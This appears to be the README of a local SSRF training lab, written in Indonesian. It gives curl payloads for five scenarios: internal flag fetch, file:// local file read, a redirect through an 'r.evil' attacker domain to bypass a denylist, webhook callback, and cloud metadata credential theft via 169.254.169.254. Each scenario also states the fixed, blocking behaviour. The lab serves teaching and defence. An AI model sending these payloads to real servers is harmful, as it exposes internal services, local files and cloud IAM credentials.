# SSRF Lab — payload request set

## Target internal (jalankan sendiri, jangan expose)
Internal service: `http://127.0.0.1:5091`
- `/internal/flag` → flag
- `/internal/meta` → meta host/scheme + secret
- `/internal/probe?q=`
- `/latest/meta-data/iam/security-credentials/` → cloud metadata (simulasi 169.254.169.254)

## s1 — Image proxy (fetch URL tanpa validasi host)
```bash
curl -G 'http://127.0.0.1:5092/svc/check-img' --data-urlencode "url=http://127.0.0.1:5091/internal/flag"
```
RENTAN: banner = flag internal. FIXED: pesan `BLOCKED: host bukan allowlist` (hanya `cdn.corp-test.local`).

## s2 — Avatar dari URL / file:// local file read
```bash
curl -G 'http://127.0.0.1:5092/svc/avatar' --data-urlencode "url=file:///D:/OPENCODE/ssrf-lab/secret.txt"
```
RENTAN: isi `secret.txt` (credential + FLAG) terbaca. FIXED: `BLOCKED: scheme "file" tidak diizinkan`.

## s3 — Content checker, bypass denylist IP via redirect
```bash
curl -G 'http://127.0.0.1:5092/svc/ping' --data-urlencode "url=http://r.evil:5092/evil/redirect"
```
`r.evil` = domain attacker (di dunia nyata DNS attacker → IP internal; di lab dipetakan ke `127.0.0.1`). `/evil/redirect` me-302 ke `http://127.0.0.1:5091/internal/flag`.
RENTAN: denylist literal lolos (host "r.evil" bukan string terlarang), redirect diikuti → flag. FIXED: resolve host → `127.0.0.1` terdeteksi privat → koneksi batal, redirect tidak diikuti.

## s4 — Webhook endpoint (callback SSRF)
```bash
curl -G 'http://127.0.0.1:5092/svc/webhook' --data-urlencode "url=http://127.0.0.1:5091/internal/meta?ref=webhook"
```
RENTAN: server meng-call internal meta → respon (host + FLAG) tersimpan & tampil di panel. FIXED: `BLOCKED: yang diizinkan hanya URL https` / IP privat diblokir.

## s5 — Cloud metadata SSRF (169.254.169.254)
```bash
curl -G 'http://127.0.0.1:5092/svc/meta' --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
RENTAN: filter "legacy" (RFC1918 + loopback) **tidak memblokir 169.254.0.0/16** → server (yang ada di cloud) membaca metadata → IAM credentials + FLAG bocor. FIXED: `BLOCKED: 169.254.169.254 (169.254.169.254) link-local/cloud metadata`.

> Catatan lab: `169.254.169.254` di-route-kan secara lokal ke metadata simulator di internal (5091) supaya bisa ditembak tanpa kuota cloud. Di dunia nyata, request langsung ke metadata endpoint sungguhan.

## API
- `POST /api/toggle/<s1..s5>` body `{"vulnerable": true|false}`
- `POST /api/poc/<s1..s5>` — exploit tercript dari server
- `GET /api/state`